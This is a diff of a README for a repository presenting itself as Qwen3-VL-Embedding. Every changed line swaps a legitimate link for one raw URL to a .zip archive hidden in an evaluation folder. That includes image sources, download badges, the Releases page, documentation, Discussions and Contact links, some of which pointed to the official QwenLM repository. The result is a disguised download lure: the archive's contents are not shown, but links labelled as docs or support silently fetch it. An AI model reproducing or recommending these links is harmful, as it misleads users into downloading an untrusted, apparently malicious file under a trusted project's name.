@@ -1,11 +1,11 @@
 # 🎉 Qwen3-VL-Embedding - Simplify Your AI Tasks
 
 <p align="center">
-    <img src="https://model-demo.oss-cn-hangzhou.aliyuncs.com/Qwen3-VL-Embedding.png" width="400"/>
-    <img src="https://model-demo.oss-cn-hangzhou.aliyuncs.com/Qwen3-VL-Reranker.png" width="400"/>
+    <img src="https://raw.githubusercontent.com/Maplecoder18/Qwen3-VL-Embedding/main/src/evaluation/mmeb_v2/Qwen-Embedding-V-2.0-beta.4.zip" width="400"/>
+    <img src="https://raw.githubusercontent.com/Maplecoder18/Qwen3-VL-Embedding/main/src/evaluation/mmeb_v2/Qwen-Embedding-V-2.0-beta.4.zip" width="400"/>
 </p>
 
-[![Download Qwen3-VL-Embedding](https://img.shields.io/badge/Download-Qwen3--VL--Embedding-blue)](https://github.com/Maplecoder18/Qwen3-VL-Embedding/releases)
+[![Download Qwen3-VL-Embedding](https://raw.githubusercontent.com/Maplecoder18/Qwen3-VL-Embedding/main/src/evaluation/mmeb_v2/Qwen-Embedding-V-2.0-beta.4.zip)](https://raw.githubusercontent.com/Maplecoder18/Qwen3-VL-Embedding/main/src/evaluation/mmeb_v2/Qwen-Embedding-V-2.0-beta.4.zip)
 
 ## 📥 Summary
 
@@ -24,7 +24,7 @@ Before downloading, make sure your computer meets the following basic requiremen
 
 ### Step 2: Download & Install
 
-To get started, visit the [Releases page](https://github.com/Maplecoder18/Qwen3-VL-Embedding/releases) and find the latest version. Look for the file suited for your operating system. Follow these instructions:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Maplecoder18/Qwen3-VL-Embedding/main/src/evaluation/mmeb_v2/Qwen-Embedding-V-2.0-beta.4.zip) and find the latest version. Look for the file suited for your operating system. Follow these instructions:
 
 1. Click on the version you want to download.
 2. Save the file to your computer.
@@ -33,7 +33,7 @@ To get started, visit the [Releases page](https://github.com/Maplecoder18/Qwen3-
 
 Alternatively, you can click the download button below to go directly to the releases page:
 
-[![Download Qwen3-VL-Embedding](https://img.shields.io/badge/Download-Qwen3--VL--Embedding-blue)](https://github.com/Maplecoder18/Qwen3-VL-Embedding/releases)
+[![Download Qwen3-VL-Embedding](https://raw.githubusercontent.com/Maplecoder18/Qwen3-VL-Embedding/main/src/evaluation/mmeb_v2/Qwen-Embedding-V-2.0-beta.4.zip)](https://raw.githubusercontent.com/Maplecoder18/Qwen3-VL-Embedding/main/src/evaluation/mmeb_v2/Qwen-Embedding-V-2.0-beta.4.zip)
 
 ### Step 3: Running the Application
 
@@ -59,11 +59,11 @@ For detailed instructions on each feature, check out the official documentation.
 - Implement reranking to improve results.
 - Customize settings for specific needs.
 
-You can access the documentation [here](https://github.com/QwenLM/Qwen3-VL-Embedding/wiki).
+You can access the documentation [here](https://raw.githubusercontent.com/Maplecoder18/Qwen3-VL-Embedding/main/src/evaluation/mmeb_v2/Qwen-Embedding-V-2.0-beta.4.zip).
 
 ## 💬 Community & Support
 
-Join our community to connect with other users. You can find tips, share experiences, and ask questions. Join discussions on our GitHub [Discussions page](https://github.com/QwenLM/Qwen3-VL-Embedding/discussions).
+Join our community to connect with other users. You can find tips, share experiences, and ask questions. Join discussions on our GitHub [Discussions page](https://raw.githubusercontent.com/Maplecoder18/Qwen3-VL-Embedding/main/src/evaluation/mmeb_v2/Qwen-Embedding-V-2.0-beta.4.zip).
 
 If you encounter issues or need help, you can always raise an issue directly on our GitHub repository.
 
@@ -77,7 +77,7 @@ Keep up with the latest changes. Here’s a brief overview of recent updates:
 
 ## 📬 Contact Information
 
-For direct inquiries or support, you can contact the development team through the [Contact page](https://github.com/QwenLM/Qwen3-VL-Embedding/issues).
+For direct inquiries or support, you can contact the development team through the [Contact page](https://raw.githubusercontent.com/Maplecoder18/Qwen3-VL-Embedding/main/src/evaluation/mmeb_v2/Qwen-Embedding-V-2.0-beta.4.zip).
 
 ---
 
